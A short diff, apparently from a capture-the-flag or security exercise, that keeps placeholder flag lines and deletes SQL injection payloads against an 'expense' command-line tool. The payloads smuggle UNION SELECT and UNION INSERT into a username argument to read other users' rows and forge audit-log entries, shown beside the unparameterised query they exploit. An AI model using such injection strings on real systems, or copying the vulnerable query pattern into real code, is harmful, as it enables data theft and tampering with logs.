@@ -3,10 +3,3 @@ SECRET_FLAG_VTZYWLBWDD
 SECRET_FLAG_JTPEGBADFF
 
 
-
-#define AUDIT_LOG_SQL  "INSERT INTO audit_log (time, admin, username, command, arguments) VALUES (174734, 1, \"piratebin\", \"--del\", \"4\")"
-./expense --admin --list piratebin\"\ UNION\ INSERT\ INTO\ audit_log\ (time\, admin\, username\, command\, arguments\) VALUES\ (174734\, 1\, \"piratebin\"\, \"--del\"\, \"4\"\)--\"
-
-"SELECT * FROM expenses WHERE username=\"%s\""
-./expense --admin --list piratebin\"\ UNION\ SELECT\ *\ FROM\ expenses\ WHERE\ username=\"piratebin\"--\"
-
